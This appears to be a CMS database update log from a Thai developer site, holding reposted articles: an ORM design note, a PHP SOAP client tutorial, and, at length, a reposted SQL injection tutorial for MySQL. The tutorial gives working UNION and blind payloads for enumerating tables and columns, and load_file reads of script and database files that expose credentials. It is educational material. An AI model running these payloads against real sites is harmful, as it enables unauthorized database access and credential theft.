+ต้องเข้าใจเรื่อง Application / System Performance Transaction Persistence Mechanism Resource&lt;br /&gt;
+Comsumption ด้วย&lt;br /&gt;
+&lt;br /&gt;
+ดังนั้นหากต้องการ Generate จากคลาสไปเป็น Table โดยใช้ Tool ต้องศึกษาว่า Tool นั้นใช้เทคนิคการ Map แบบไหน&lt;br /&gt;
+สามารถให้เราปรับแต่งหรือกำหนดการ Map ได้หรือไม่ (Tool ส่วนมากให้ทำได้)&lt;br /&gt;
+&lt;br /&gt;
+แต่ที่สำคัญคลาสที่จะถูก Generate ไปเป็น Table ต้องเป็น Entity Class เช่น เป็นพวก Value ob<x>ject (JavaBeans)&lt;br /&gt;
+ซึงคลาสเหล่านี้จะมี Persistence Mechanism / Logic ฝังอยู่ด้วยหรือไม่ก็ได้ ขึ้นกับเทคนิคการออกแบบ&lt;br /&gt;
+&lt;br /&gt;
+ลองหาหนังสือชื่อ Patterns of Enterprise Application Architecture โดย Martin Fowler มาอ่านดูนะครับ&lt;br /&gt;
+จะมี Architectural Patterns ที่น่าสนใจในการทำ ob<x>ject-to-Relational Mapping รวมถึงการทำ Inheritance Mapping&lt;br /&gt;
+ที่น่าสนใจหลายตัว และอ่านง่าย&lt;br /&gt;
+&lt;br /&gt;
+- จงอย่าเชื่อ Tool เสมอไปว่ามันเลือกใช้กลยุทธ์ (Strategy) ที่ดีที่สุดในการทำ Mapping / Generate ให้กับเรา -&lt;br /&gt;
+&lt;br /&gt;
+- ผลลัพธ์ของการออกแบบจะไม่แสดงให้เห็นทันทีที่ซอฟต์แวร์ถูกพัฒนาเสร็จ ดังนั้น Software Testing ควรถูกบรรจุ&lt;br /&gt;
+ไว้ทุก ๆ ช่วงของกระบวนการพัฒนาซอฟต์แวร์ -&lt;br /&gt;
+&lt;br /&gt;
+minimalist (ณรงค์ จันทร์สร้อย)&lt;br /&gt;
+21 ธันวาคม 2549 &lt;/b&gt;&lt;!--IBF.ATTACHMENT_76984--&gt;&lt;!-- THE POST --&gt;&lt;/p&gt;' Where content_id = 14 
+14:03:48 :  => ERROR : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1Update content SET category_id='',content_name='',content_summary='',content_detail='' Where content_id =  
+14:03:48 :  => Update content SET category_id='',content_name='MySQL table and column names',content_summary='&lt;p&gt;&lt;img height=&quot;120&quot; width=&quot;120&quot; src=&quot;http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/databa<x>se.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Getting&amp;nbsp;the table and column names within a SQL injection attack is often a problem and I&amp;rsquo;ve seen a lot of questions about this on the internet. Often you need them to start further SQLi attacks to get the data. So&amp;nbsp;this article shows you how I would try to get the data in different scenarios on MySQL. For other databa<x>ses I recommend the extensive cheat sheets from &lt;a href=&quot;http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/&quot;&gt;pentestmonkey&lt;/a&gt;.&lt;/p&gt;',content_detail='&lt;h2&gt;&lt;a ti<x>tle=&quot;Permanent li<x>nk: MySQL table and column&amp;nbsp;names&quot; rel=&quot;bookmark&quot; href=&quot;http://websec.wordpress.com/2007/11/17/mysql-table-and-column-names/&quot;&gt;&lt;br /&gt;
+&lt;/a&gt;&lt;/h2&gt;
+&lt;div class=&quot;snap_preview&quot;&gt;
+&lt;p&gt;Getting&amp;nbsp;the table and column names within a SQL injection attack is often a problem and I&amp;rsquo;ve seen a lot of questions about this on the internet. Often you need them to start further SQLi attacks to get the data. So&amp;nbsp;this article shows you how I would try to get the data in different scenarios on MySQL. For other databa<x>ses I recommend the extensive cheat sheets from &lt;a href=&quot;http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/&quot;&gt;pentestmonkey&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Please note that attacking websites you are not allowed to attack is a crime and should not be done. This article is for learning purposes only.&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a ti<x>tle=&quot;article&amp;nbsp;overview&quot; href=&quot;http://websec.files.wordpress.com/2007/11/names_overview.png&quot;&gt;&lt;img alt=&quot;article&amp;nbsp;overview&quot; src=&quot;http://websec.files.wordpress.com/2007/11/names_overview.png&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;For the following injections I&amp;rsquo;ll assume you understand the &lt;a href=&quot;http://www.google.com/search?q=SQL%20injection&quot;&gt;basics of SQL injection&lt;/a&gt; and &lt;a href=&quot;http://dev.mysql.com/doc/refman/5.1/en/union.html&quot;&gt;union select&lt;/a&gt;. My injections are written for&amp;nbsp;a SELECT query with&amp;nbsp;two columns however don&amp;rsquo;t forget to add &lt;em&gt;null&lt;/em&gt;s &lt;a href=&quot;http://devels-playground.blogspot.com/2007/08/union-select-column-count.html&quot;&gt;in the right amount&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;a ti<x>tle=&quot;1&quot; name=&quot;1&quot;&gt;&lt;/a&gt;&lt;strong&gt;1. The information_schema table&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a ti<x>tle=&quot;1.a&quot; name=&quot;1.a&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.a. Read information_schema table normally&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Sometimes on MySQL &amp;gt;=5.0 you can access the &lt;a href=&quot;http://dev.mysql.com/doc/refman/5.0/en/information-schema.html&quot;&gt;information_schema table&lt;/a&gt;.&lt;br /&gt;
+So you may want to check which MySQL version is running:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;0&amp;prime; UNION SELECT version()null /*&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
+or:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;0&amp;prime; UNION SELECT @@versionnull /*&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Once you know which version is running proceed with these steps (MySQL &amp;gt;= 5.0) or &lt;a href=&quot;http://websec.wordpress.com/2007/11/17/mysql-table-and-column-names/#2&quot;&gt;jump to the next point&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;You can either get the names step by step or at once.&lt;/p&gt;
+&lt;p&gt;First get the &lt;em&gt;tablenames&lt;/em&gt;:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;0&amp;prime; UNION SELECT table_namenull FROM information_schema.tables WHERE version = &amp;lsquo;9&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
+Note that &lt;em&gt;version=9&lt;/em&gt; has nothing to do with the MySQL version. It&amp;rsquo;s just an unique identifier for user generated tables so leave as it is to ignore MySQL system table names.&lt;br /&gt;
+&lt;b&gt;update:&lt;/b&gt; Testing another MySQL version (5.0.51a) I noticed that the version is &amp;ldquo;10&amp;Prime; for user generated tables. so dont worry if you dont get any results. instead of the unique identifier you can also use &amp;ldquo;LIMIT offsetamount&amp;rdquo;.&lt;/p&gt;
+&lt;p&gt;Second get the &lt;em&gt;columnnames&lt;/em&gt;:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;0&amp;prime; UNION SELECT column_namenull FROM information_schema.columns WHERE table_name = &amp;lsquo;tablename&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Or with one injection:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;0&amp;prime; UNION SELECT column_name<x>table_name FROM information_schema.columns /*&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
+Unfortunetly there is no unique identifier so you have to scroll through the whole information_schema table if you use this.&lt;/p&gt;
+&lt;p&gt;Once you know table name and column name you can &lt;em&gt;union select&lt;/em&gt; all the data you need.&lt;/p&gt;
+&lt;p&gt;For more details about the information_schema table see the &lt;a href=&quot;http://dev.mysql.com/doc/refman/5.0/en/information-schema.html&quot;&gt;MySQL Documentation Library&lt;/a&gt;. There you&amp;rsquo;ll find other interesting columns you can add instead of &lt;em&gt;null&lt;/em&gt; for example &lt;em&gt;data_type&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;Ok that was the easiest part.&lt;/p&gt;
+&lt;p&gt;&lt;a ti<x>tle=&quot;1.b&quot; name=&quot;1.b&quot;&gt;&lt;/a&gt;&lt;strong&gt;1.b. Read information_schema table blindly&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Sometimes you can&amp;rsquo;t see the output of your request however there are some techniques to get the info blindly called &lt;a href=&quot;http://www.imperva.com/download.asp?id=4&quot;&gt;Blind SQL Injection&lt;/a&gt;. I&amp;rsquo;ll assume you know the basics.&lt;br /&gt;
+However make sure you really need to use blind injection. Often you just have to make sure the actual result returns null and the output of your injection gets processed by the mysql_functions instead. Use something like &lt;em&gt; AND 1=0&lt;/em&gt; to make sure the actual output is null and then append your union select to get your data for example:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;1&amp;prime; AND 1=0 UNION SELECT @@versionnull /*&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;If you really need blind SQL injection we&amp;rsquo;ll go through the same steps as above so first we try to get the version:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;1&amp;prime;AND &lt;a href=&quot;http://dev.mysql.com/doc/refman/5.1/en/string-functions.html#function_substring&quot;&gt;MID&lt;/a&gt;(version()11) like &amp;lsquo;4&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;The request will be successfull and the same page will be displayed like as we did no injection if the version starts with &amp;ldquo;4&amp;Prime;. If not I&amp;rsquo;ll guess the server is running MySQL 5. Check it out:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;1&amp;prime;AND &lt;a href=&quot;http://dev.mysql.com/doc/refman/5.1/en/string-functions.html#function_substring&quot;&gt;MID&lt;/a&gt;(version()11) like &amp;lsquo;5&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Always remember to put a value before the actual injection which would give &amp;ldquo;normal&amp;rdquo; output. If the output does not differ no matter what you&amp;rsquo;ll inject try some benchmark tests:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;1&amp;prime; UNION SELECT (if(mid(version()11) like 4 &lt;a href=&quot;http://dev.mysql.com/doc/refman/5.0/en/information-functions.html#function_benchmark&quot;&gt;benchmark&lt;/a&gt;(100000sha1(&amp;rsquo;test&amp;rsquo;)) &amp;lsquo;false&amp;rsquo;))null /*&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
+But be careful with the benchmark values you dont want to crash your browser ;-). I&amp;rsquo;d suggest you to try some values first to get a acceptable response time.&lt;/p&gt;
+&lt;p&gt;Once we know the version number you can proceed with these steps (MySQL &amp;gt;= 5.0) or &lt;a href=&quot;http://websec.wordpress.com/2007/11/17/mysql-table-and-column-names/#2&quot;&gt;jump to the next point&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Since we cant read out the table name we have to brute it. Yes that can be annoying but who said it would be easy?&lt;br /&gt;
+We&amp;rsquo;ll use the same injection as in 1.) but now with blind injection technique:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;1&amp;prime; AND MID((SELECT table_name FROM information_schema.tables WHERE version = 9 LIMIT 1)11) &amp;gt; &amp;lsquo;m&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Again this will check if the first letter of our first table is alphabetically located behind &amp;ldquo;m&amp;rdquo;. As stated above &lt;em&gt;version=9&lt;/em&gt; has nothing to do with the MySQL version number and is used here to fetch only user generated tables.&lt;br /&gt;
+Once you got the right letter move on to the next:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;1&amp;prime; AND MID((SELECT table_name FROM information_schema.tables WHERE version = 9 LIMIT 1)21) &amp;gt; &amp;lsquo;m&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
+And so on.&lt;/p&gt;
+&lt;p&gt;If you got the tablename you can brute its columns. This works as the same principle:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;1&amp;prime; AND MID((SELECT column_name FROM information_schema.columns WHERE table_name = &amp;lsquo;tablename&amp;rsquo; LIMIT 1)11) &amp;gt; &amp;lsquo;m&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;1&amp;prime; AND MID((SELECT column_name FROM information_schema.columns WHERE table_name = &amp;lsquo;tablename&amp;rsquo; LIMIT 1)21) &amp;gt; &amp;lsquo;m&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;1&amp;prime; AND MID((SELECT column_name FROM information_schema.columns WHERE table_name = &amp;lsquo;tablename&amp;rsquo; LIMIT 1)31) &amp;gt; &amp;lsquo;m&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
+And so on.&lt;/p&gt;
+&lt;p&gt;To check the next name just skip the first bruted &lt;em&gt;tablename&lt;/em&gt; with &lt;a href=&quot;http://dev.mysql.com/doc/refman/5.1/de/select.html&quot;&gt;LIMIT&lt;/a&gt; (see comments for more details about the index):&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;1&amp;prime; AND MID((SELECT table_name FROM information_schema.tables WHERE version = 9 LIMIT 11)11) &amp;gt; &amp;lsquo;m&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
+Or &lt;em&gt;columnname&lt;/em&gt;:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;1&amp;prime; AND MID((SELECT column_name FROM information_schema.columns WHERE table_name = &amp;lsquo;tablename&amp;rsquo; LIMIT 11)11) &amp;gt; &amp;lsquo;m&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Sometimes it also makes sense to check the length of the name first so maybe you can guess it easier the more letters you reveal.&lt;br /&gt;
+Check for the tablename:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;1&amp;prime; AND MID((SELECT table_name FROM information_schema.tables WHERE version = 9 LIMIT 1)61)=&amp;rsquo;&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
+Or for the column name:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;1&amp;prime; AND MID((SELECT column_name FROM information_schema.columns WHERE table_name = &amp;lsquo;tablename&amp;rsquo; LIMIT 1)61)=&amp;rsquo;&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
+Both injections check if the sixth letter is not empty. If it is and the fifth letter exists you know the name is 5 letters long.&lt;/p&gt;
+&lt;p&gt;Since we know that the information_schema table has 33 entries by default we can also check out how many user generated tables exist. That means that every entry more than 33 is a table created by a user.&lt;br /&gt;
+If the following succeeds it means that there is one user generated table:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;1&amp;prime; AND 34=(SELECT COUNT(*) FROM information_schema.tables)/*&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
+There are two tables if the following is true:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;1&amp;prime; AND 35=(SELECT COUNT(*) FROM information_schema.tables)/*&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
+And so on.&lt;/p&gt;
+&lt;p&gt;&lt;a ti<x>tle=&quot;2&quot; name=&quot;2&quot;&gt;&lt;/a&gt;&lt;strong&gt;2. You don&amp;rsquo;t have access to information_schema table&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;If you don&amp;rsquo;t have access to the information_schema table (default) or hit a MySQL version &amp;lt; 5.0 it&amp;rsquo;s quite difficult on MySQL.&lt;br /&gt;
+There is only one error message I could find that reveals a name:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;1&amp;prime;%&amp;rsquo;0&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
+&lt;em&gt;Query failed: Column &amp;lsquo;id&amp;rsquo; cannot be null&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;But that doesnt give you info on other column or table names and only works if you can access error messages. However it could make guessing the other names easier.&lt;/p&gt;
+&lt;p&gt;If you don&amp;rsquo;t want to use a bruteforce tool we will have to use &lt;a href=&quot;http://dev.mysql.com/doc/refman/4.1/en/string-functions.html#function_load-file&quot;&gt;load_file&lt;/a&gt;. But that will require that you can see the output of course.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&amp;ldquo;To use this function the file must be located on the server host you must specify the full pathname to the file and you must have the FILE privilege. The file must be readable by all and its size less than max_allowed_packet bytes.&amp;rdquo;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;You can read out &lt;a href=&quot;http://dev.mysql.com/doc/refman/5.1/de/program-variables.html&quot;&gt;max_allowed_packet&lt;/a&gt; on MySQL 5&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;0&amp;prime; UNION SELECT @@max_allowed_packetnull /*&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
+Mostly you&amp;rsquo;ll find the standard value &lt;em&gt;1047552&lt;/em&gt; (Byte).&lt;/p&gt;
+&lt;p&gt;Note that load_file always starts to look in the &lt;em&gt;datadir&lt;/em&gt;. You can read out the datadir with:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;0&amp;prime; UNION SELECT @@datadirnull /*&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
+So if your &lt;em&gt;datadir&lt;/em&gt; is &lt;em&gt;/var/lib/mysql&lt;/em&gt; for example &lt;em&gt;load_file(&amp;rsquo;file.txt&amp;rsquo;)&lt;/em&gt; will look for &lt;em&gt;/var/lib/mysql/file.txt&lt;/em&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;a ti<x>tle=&quot;2.a&quot; name=&quot;2.a&quot;&gt;&lt;/a&gt;&lt;strong&gt;2.a. Read the sc<x>ript file&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Now the first thing I would try is to load the actual sc<x>ript file. This not only gives you the exact query with all table and column names but also the databa<x>se connection credentials. A file read &lt;em&gt;could&lt;/em&gt; look like this:&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;0&amp;prime; UNION SELECT load_file(&amp;rsquo;../../../../Apache/htdocs/path/file.php&amp;rsquo;)null /*&lt;/strong&gt;&lt;/em&gt; (Windows)&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;0&amp;prime; UNION SELECT load_file(&amp;rsquo;../../../var/www/path/file.php&amp;rsquo;)null /*&lt;/strong&gt;&lt;/em&gt; (Linux)&lt;/p&gt;
+&lt;p&gt;The amount of directories you have to jump back with &lt;em&gt;../&lt;/em&gt; is the amount of directories the &lt;em&gt;datadir&lt;/em&gt; path has. After that follows the webserver path.&lt;br /&gt;
+All about file privileges and webserver path can be found in my &lt;a href=&quot;http://websec.wordpress.com/2007/11/17/mysql-into-outfile/&quot;&gt;article about into outfile&lt;/a&gt;.&lt;br /&gt;
+Once you got the sc<x>ript you can also use &lt;em&gt;into outfile&lt;/em&gt; combined with &lt;em&gt;OR 1=1&lt;/em&gt; to write the whole output to a file or to set up a little PHP sc<x>ript on the target webserver which reads out the whole databa<x>se (or the information you want) for you.&lt;/p&gt;
+&lt;p&gt;&lt;a ti<x>tle=&quot;2.b&quot; name=&quot;2.b&quot;&gt;&lt;/a&gt;&lt;strong&gt;2.b) Read the databa<x>se file&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;On MySQL 4&amp;nbsp;and&amp;nbsp;5 you can also use &lt;em&gt;load_file&lt;/em&gt; to get the table content.&lt;/p&gt;
+&lt;p&gt;The databa<x>se files are usually stored in&lt;br /&gt;
+&lt;em&gt;@@datadir/databa<x>sename/&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Take a look at &lt;a href=&quot;http://websec.wordpress.com/2007/11/17/mysql-table-and-column-names/#2&quot;&gt;step 2.&lt;/a&gt; how to get the &lt;em&gt;datadir&lt;/em&gt;. An injection we need to read the databa<x>se content looks like this:&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;0&amp;prime; UNION SELECT load_file(&amp;rsquo;databa<x>sename/tablename.MYD&amp;rsquo;)null /*&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;As you can see we need the databa<x>sename and tablename first. The databa<x>sename is easy:&lt;br /&gt;
+&lt;em&gt;&lt;strong&gt;0&amp;prime; UNION SELECT databa<x>se()null /*&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;The table name is the hard part. Actually you can only guess or bruteforce it with a good wordlist and something like:&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;strong&gt;0&amp;prime; UNION SELECT &amp;rsquo;success&amp;rsquo;null FROM testname /*&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;This will throw an error if testname does not exists or display &amp;ldquo;success&amp;rdquo; if tablename testname exists.&lt;br /&gt;
+If you try to guess the name have a look at all errors vars and html sources you can get to get an idea of how they could have named the table / columns. Often it is not as difficult as it seems first.&lt;br /&gt;
+You can find a small wordlist for common tablenames &lt;a href=&quot;http://raz0r.name/wp-content/uploads/2008/06/common_tbl.txt&quot;&gt;here&lt;/a&gt; (by Raz0r).&lt;/p&gt;
+&lt;p&gt;Also note that the file loaded with &lt;em&gt;load_file()&lt;/em&gt; must be smaller than &lt;em&gt;max_allowed_packet&lt;/em&gt; so this wont work on huge databa<x>se files because the standard value is ~1 MB which will suffice for &lt;em&gt;only&lt;/em&gt; about 100.000 entries (if my calculation is right ;-))&lt;/p&gt;
+&lt;p&gt;&lt;a ti<x>tle=&quot;2.c&quot; name=&quot;2.c&quot;&gt;&lt;/a&gt;&lt;strong&gt;(2.c. Compromising the server)&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;There are no other ways to get the data as far as I know except of compromising the server via &lt;a href=&quot;http://websec.wordpress.com/2007/11/17/mysql-into-outfile/&quot;&gt;MySQL into outfile&lt;/a&gt; or with other techniques which are beyond the scope of this article (e.g. LFI).&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;/div&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;' Where content_id = 9 
+14:03:49 :  => Update content SET category_id='',content_name='การใช้ PHP5 เรียกเว็บเซอร์วิสแบบ SOAP',content_summary='&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;&lt;span st<x>yle=&quot;font-size: smaller;&quot;&gt;&lt;img height=&quot;64&quot; width=&quot;111&quot; alt=&quot;&quot; src=&quot;http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/php.jpg&quot; /&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;&lt;span st<x>yle=&quot;font-size: smaller;&quot;&gt;ไปพบใน Narisa มาครับเห็นว่ามีประโยชน์ ขอบคุณต้นฉบับด้วยนะครับ &lt;br /&gt;
+http://www.narisa.com/forums/index.php?showtopic=23153&lt;br /&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;&lt;span st<x>yle=&quot;font-size: smaller;&quot;&gt; ภาษา PHP เป็นภาษาที่เหมาะสมในการพัฒนาเว็บแอปพลิเคชัน &lt;br /&gt;
+เนื่องจากเป็นภาษาที่ง่าย เรียนรู้ได้เร็ว &lt;br /&gt;
+และสามารถนำมาใช้ได้ฟรี การเรียกใช้เว็บเซอร์วิสด้วยภาษา PHP จึงเป็นที่นิยม&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;',content_detail='&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;ไปพบใน Narisa มาครับเห็นว่ามีประโยชน์ ขอบคุณต้นฉบับด้วยนะครับ http://www.narisa.com/forums/index.php?showtopic=23153&lt;br /&gt;
+&lt;br /&gt;
+ภาษา PHP เป็นภาษาที่เหมาะสมในการพัฒนาเว็บแอปพลิเคชัน เนื่องจากเป็นภาษาที่ง่าย เรียนรู้ได้เร็ว และสามารถนำมาใช้ได้ฟรี &lt;br /&gt;
+การเรียกใช้เว็บเซอร์วิสด้วยภาษา PHP จึงเป็นที่นิยม ภาษา PHP เวอร์ชันปัจจุบันคือ PHP5 ซึ่งมีความสามารถในการสนับสนุนการเรียกใช้เว็บเซอร์วิสในตัวโดยไม่ต้องดาวน์ โหลดเครื่องมืออะไรเพิ่มเติม ซึ่งจะทำให้ง่ายกว่าการที่ต้องไปดาวน์โหลดเครื่องมืออย่างเช่น NuSOAP ซึ่ง อัปเดตล่าสุดในปี ค.ศ. 2005 อีกทั้งไม่ได้มีกลุ่มผู้ใช้อย่างมากเหมือนกับ SOAP extension ของ PHP5&lt;br /&gt;
+&lt;br /&gt;
+ใน PHP5 มี SOAP extension  ที่ทำให้การเรียกใช้เว็บเซอร์วิสแบบ SOAP ง่ายขึ้นโดยการใช้คลาส  SoapClient&lt;br /&gt;
+&lt;br /&gt;
+ขั้นตอนวิธีการมีดังต่อไปนี้&lt;br /&gt;
+&lt;br /&gt;
+1)  หากเราต้องการเรียกใช้เว็บเซอร์วิสแบบ SOAP ใดเราก็ต้องรู้ที่อยู่ของเอกสาร WSDL  ของเว็บเซอร์วิสนั้นก่อน เช่น&lt;br /&gt;
+&lt;br /&gt;
+$client = new  SoapClient($wsdl);&lt;br /&gt;
+&lt;br /&gt;
+ถ้าหากว่าพบปัญหา Class \'SoapClient\' not found  ให้เพิ่มบรรทัดนี้ในไฟล์  php.ini&lt;br /&gt;
+&lt;br /&gt;
+extension=php_soap.dll&lt;br /&gt;
+&lt;br /&gt;
+ซึ่งถ้าหากใช้ระบบปฏิบัติการ Windows  ไฟล์ php.ini อยู่ที่ไดเรกทอรี c:\\windows&lt;br /&gt;
+&lt;br /&gt;
+2) จากนั้นใช้ฟังก์ชัน _soapCall  เพื่อเรียกใช้เมธอดที่เราต้องการโดยที่จะต้องระบุอินพุตพารามิเตอร์ในรูปแบบอาร์เรย์  เช่น&lt;br /&gt;
+&lt;br /&gt;
+$result = $client-&amp;gt;__soapCall($methodName  array($methodArguments));&lt;br /&gt;
+&lt;br /&gt;
+3) ถ้าหากเราเรียกใช้เว็บเซอร์วิสที่พัฒนาโดยใช้ Microsoft .NET จะต้องมีการระบุ SOAP Action ในอาร์กิวเมนต์ของฟังก์ชัน __soapCall เช่น&lt;br /&gt;
+&lt;br /&gt;
+$result = $client-&amp;gt;__soapCall($methodName  array($methodArguments) array(\'soapaction\' =&amp;gt; $soapAction));&lt;br /&gt;
+&lt;br /&gt;
+4) ถ้าหากเราเรียกใช้เว็บเซอร์วิสที่พัฒนาโดย Microsoft .NET จะได้ผลลัพธ์ที่อยู่ในรูปออปเจตก์ที่ประกอบด้วยอิลิเมนต์ที่มีชื่อตรงกับอิล ิเมนต์เอาต์พุตตามที่ระบุในเอกสาร WSDL เช่น&lt;br /&gt;
+&lt;br /&gt;
+echo  $result-&amp;gt;outputElemName;&lt;br /&gt;
+&lt;br /&gt;
+เรา ลองมาดูตัวอย่างของการเรียกใช้เว็บเซอร์วิส ปตท (http://www.pttplc.com/pttinfo.asmx) ซึ่งพัฒนาเป็นเว็บเซอร์วิสแบบ SOAP โดยใช้ C#.NET ด้วยโปรแกรมที่เขียนโดยภาษา PHP ดังนี้&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+&amp;lt;?php&lt;br /&gt;
+&lt;br /&gt;
+// ที่อยู่ของเอกสาร WSDL ของเว็บเซอร์วิส  ปตท&amp;quot;);&lt;br /&gt;
+$wsdl = \'http://www.pttplc.com/pttinfo.asmx?WSDL\';&lt;br /&gt;
+&lt;br /&gt;
+//  สร้างออปเจกต์ SoapClient เพื่อเรียกใช้เว็บเซอร์วิส&lt;br /&gt;
+$client = new  SoapClient($wsdl);&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+// เมธอดที่ต้องการเรียกใช้  CurrentOilPrice&lt;br /&gt;
+$methodName = \'CurrentOilPrice\';&lt;br /&gt;
+&lt;br /&gt;
+&lt;br /&gt;
+//  อินพุตพารามิเตอร์ของเมธอด CurrentOilPrice คือ&lt;br /&gt;
+// Language  ซึ่งเราตั้งค่าให้เป็น TH ถ้าหากต้องการแสดงผลเป็นภาษาไทย&lt;br /&gt;
+$params =  array(\'Language\'=&amp;gt;\'TH\');&lt;br /&gt;
+&lt;br /&gt;
+// ระบุค่าของ SOAP Action URI&lt;br /&gt;
+$soapAction  = \'http://www.pttplc.com/ptt_webservice/CurrentOilPrice\';&lt;br /&gt;
+&lt;br /&gt;
+// ใช้ฟังก์ชัน  _soapCall ในการเรียกเมธอดที่ระบุ&lt;br /&gt;
+// ต้องระบุพารามิเตอร์และ SOAP  Action&lt;br /&gt;
+$ob<x>jectResult = $client-&amp;gt;__soapCall($methodName array(\'parameters\'  =&amp;gt; $params) array(\'soapaction\' =&amp;gt; $soapAction));&lt;br /&gt;
+&lt;br /&gt;
+//  จะต้องดูค่าฟิลด์ที่ชื่อตรงกับชื่อของอิลิเมนต์ที่ระบุใน&lt;br /&gt;
+// Output Message  ซึ่งในที่นี้ก็คือ&lt;br /&gt;
+// CurrentOilPriceResult&lt;br /&gt;
+echo  $ob<x>jectResult-&amp;gt;CurrentOilPriceResult;&lt;br /&gt;
+&lt;!--{12343468862510}--&gt;?&amp;gt;&lt;/span&gt;&lt;/p&gt;' Where content_id = 10 
+14:03:49 :  => Update content SET category_id='',content_name='A Simple Cache with PHP',content_summary='&lt;p&gt;&lt;img height=&quot;64&quot; alt=&quot;&quot; width=&quot;111&quot; src=&quot;http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/php.jpg&quot; /&gt;&lt;/p&gt;
